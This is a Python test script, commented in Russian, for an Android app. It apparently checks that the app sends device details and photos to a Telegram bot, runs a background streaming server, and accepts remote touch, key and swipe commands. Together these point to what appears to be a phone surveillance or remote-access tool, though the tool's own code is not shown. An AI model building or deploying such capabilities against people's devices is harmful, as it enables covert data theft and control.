"""
Тестовый скрипт для имитации работы Android приложения
Проверяет все функции без реального Android устройства
"""
import os
import sys
import json
import time
import socket
import platform
from datetime import datetime

# Добавляем путь к ready_app для импорта модулей
sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'ready_app'))


def test_telegram_connection():
    """Тестирует подключение к Telegram API"""
    print("\n" + "="*60)
    print("ТЕСТ 1: Проверка подключения к Telegram")
    print("="*60)
    
    try:
        from main import get_telegram_bot_token, send_info_to_telegram
        
        token = get_telegram_bot_token()
        if not token:
            print("[ERROR] Токен Telegram не найден!")
            print("   Проверьте наличие config.json с telegram_bot_token")
            return False
        
        print(f"[OK] Токен найден: {token[:10]}...")
        
        # Тестовая отправка
        test_message = f"""ТЕСТОВОЕ СООБЩЕНИЕ

Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Платформа: {platform.system()}
Python: {platform.python_version()}

Это тестовое сообщение для проверки работы приложения."""
        
        print("Отправка тестового сообщения в Telegram...")
        result = send_info_to_telegram(test_message)
        
        if result:
            print("[OK] Сообщение успешно отправлено в Telegram!")
            return True
        else:
            print("[ERROR] Не удалось отправить сообщение")
            return False
            
    except Exception as e:
        print(f"❌ Ошибка при тестировании Telegram: {e}")
        import traceback
        traceback.print_exc()
        return False


def test_device_info_collection():
    """Тестирует сбор информации об устройстве"""
    print("\n" + "="*60)
    print("ТЕСТ 2: Сбор информации об устройстве")
    print("="*60)
    
    try:
        from main import get_mobile_info
        
        print("Сбор информации...")
        info = get_mobile_info()
        
        if not info:
            print("[ERROR] Не удалось собрать информацию")
            return False
        
        print("[OK] Информация собрана:")
        print(f"  - Платформа: {info.get('platform', 'Unknown')}")
        print(f"  - Версия: {info.get('platform_version', 'Unknown')}")
        print(f"  - IP адрес: {info.get('local_ip', 'Unknown')}")
        
        # Проверяем расширенную информацию для Android
        if 'system' in info:
            sys_info = info['system']
            print(f"  - Производитель: {sys_info.get('manufacturer', 'Unknown')}")
            print(f"  - Модель: {sys_info.get('model', 'Unknown')}")
            print(f"  - Android версия: {sys_info.get('android_version', 'Unknown')}")
        
        return True
        
    except Exception as e:
        print(f"❌ Ошибка при сборе информации: {e}")
        import traceback
        traceback.print_exc()
        return False


def test_image_handling():
    """Тестирует обработку изображений"""
    print("\n" + "="*60)
    print("ТЕСТ 3: Обработка изображений")
    print("="*60)
    
    try:
        # Проверяем наличие изображений
        image_paths = [
            "ready_app/photo.jpg",
            "ready_app/embedded_image.jpg",
        ]
        
        found_images = []
        for path in image_paths:
            if os.path.exists(path):
                size = os.path.getsize(path) / 1024  # KB
                print(f"[OK] Найдено: {path} ({size:.1f} KB)")
                found_images.append(path)
        
        if not found_images:
            print("[WARN] Изображения не найдены (это нормально для теста)")
            return True
        
        # Тестируем отправку фото
        from main import send_photo_to_telegram
        
        if found_images:
            print(f"Отправка фото: {found_images[0]}...")
            result = send_photo_to_telegram(found_images[0])
            if result:
                print("[OK] Фото успешно отправлено!")
                return True
            else:
                print("[WARN] Не удалось отправить фото (возможно, нет интернета)")
                return True  # Не критично для теста
        
        return True
        
    except Exception as e:
        print(f"[ERROR] Ошибка при обработке изображений: {e}")
        return False


def test_streaming_server():
    """Тестирует запуск стриминг сервера"""
    print("\n" + "="*60)
    print("ТЕСТ 4: Стриминг сервер")
    print("="*60)
    
    try:
        from streaming_server import StreamingServer, get_device_ip
        
        # Получаем IP адрес
        device_ip = get_device_ip()
        print(f"IP адрес устройства: {device_ip}")
        
        # Пробуем запустить сервер на тестовом порту
        test_port = 8889  # Другой порт для теста
        print(f"Запуск тестового сервера на порту {test_port}...")
        
        server = StreamingServer(port=test_port)
        if server.start():
            print(f"[OK] Сервер успешно запущен на {device_ip}:{test_port}")
            print("  Сервер работает в фоне")
            
            # Даем серверу немного поработать
            time.sleep(2)
            
            # Останавливаем сервер
            server.stop()
            print("[OK] Сервер остановлен")
            return True
        else:
            print("[ERROR] Не удалось запустить сервер")
            return False
            
    except Exception as e:
        print(f"[ERROR] Ошибка при тестировании сервера: {e}")
        import traceback
        traceback.print_exc()
        return False


def test_remote_control():
    """Тестирует модуль удаленного управления"""
    print("\n" + "="*60)
    print("ТЕСТ 5: Удаленное управление")
    print("="*60)
    
    try:
        from remote_control import RemoteController
        
        controller = RemoteController()
        
        # Тестируем обработку команд
        test_commands = [
            {'type': 'touch', 'x': 100, 'y': 200, 'action': 'tap'},
            {'type': 'key', 'key_code': 4},  # Back
            {'type': 'swipe', 'x1': 100, 'y1': 200, 'x2': 300, 'y2': 400, 'duration': 300},
        ]
        
        print("Тестирование обработки команд...")
        for cmd in test_commands:
            result = controller.handle_command(cmd)
            if result:
                print(f"[OK] Команда {cmd['type']} обработана: {result.get('success', False)}")
            else:
                print(f"[WARN] Команда {cmd['type']} не обработана (это нормально на PC)")
        
        print("[OK] Модуль удаленного управления работает")
        return True
        
    except Exception as e:
        print(f"[ERROR] Ошибка при тестировании управления: {e}")
        import traceback
        traceback.print_exc()
        return False


def test_android_detection():
    """Тестирует определение Android платформы"""
    print("\n" + "="*60)
    print("ТЕСТ 6: Определение Android платформы")
    print("="*60)
    
    try:
        from main import is_android_device
        
        is_android = is_android_device()
        print(f"Определено как Android: {is_android}")
        
        if is_android:
            print("[OK] Android платформа определена")
        else:
            print("[WARN] Не Android (это нормально на PC)")
        
        return True
        
    except Exception as e:
        print(f"[ERROR] Ошибка при определении платформы: {e}")
        return False


def test_logging():
    """Тестирует систему логирования"""
    print("\n" + "="*60)
    print("ТЕСТ 7: Система логирования")
    print("="*60)
    
    try:
        from main import log_error
        
        test_log_path = "test_log.txt"
        print(f"Тестовая запись в лог: {test_log_path}")
        
        log_error("Тестовое сообщение для проверки логирования")
        log_error("Второе тестовое сообщение", Exception("Тестовая ошибка"))
        
        if os.path.exists(test_log_path):
            print(f"[OK] Лог файл создан: {test_log_path}")
            with open(test_log_path, 'r', encoding='utf-8') as f:
                content = f.read()
                print(f"  Размер: {len(content)} байт")
                print(f"  Строк: {len(content.splitlines())}")
            return True
        else:
            print("[WARN] Лог файл не создан (возможно, нет прав на запись)")
            return True  # Не критично
        
    except Exception as e:
        print(f"[ERROR] Ошибка при тестировании логирования: {e}")
        return False


def main():
    """Запускает все тесты"""
    print("\n" + "="*60)
    print("ТЕСТИРОВАНИЕ ANDROID ПРИЛОЖЕНИЯ")
    print("="*60)
    print(f"Время запуска: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"Платформа: {platform.system()} {platform.release()}")
    print(f"Python: {platform.python_version()}")
    
    results = {}
    
    # Запускаем все тесты
    results['telegram'] = test_telegram_connection()
    results['device_info'] = test_device_info_collection()
    results['images'] = test_image_handling()
    results['streaming'] = test_streaming_server()
    results['remote_control'] = test_remote_control()
    results['android_detection'] = test_android_detection()
    results['logging'] = test_logging()
    
    # Итоговый отчет
    print("\n" + "="*60)
    print("ИТОГОВЫЙ ОТЧЕТ")
    print("="*60)
    
    passed = sum(1 for v in results.values() if v)
    total = len(results)
    
    for test_name, result in results.items():
        status = "[OK] ПРОЙДЕН" if result else "[FAIL] ПРОВАЛЕН"
        print(f"{test_name.upper():20} {status}")
    
    print(f"\nПройдено тестов: {passed}/{total}")
    
    if passed == total:
        print("\n[SUCCESS] ВСЕ ТЕСТЫ ПРОЙДЕНЫ!")
    elif passed >= total * 0.7:
        print("\n[WARN] Большинство тестов пройдено, но есть проблемы")
    else:
        print("\n[ERROR] Много тестов провалено, требуется исправление")
    
    return passed == total


if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1)
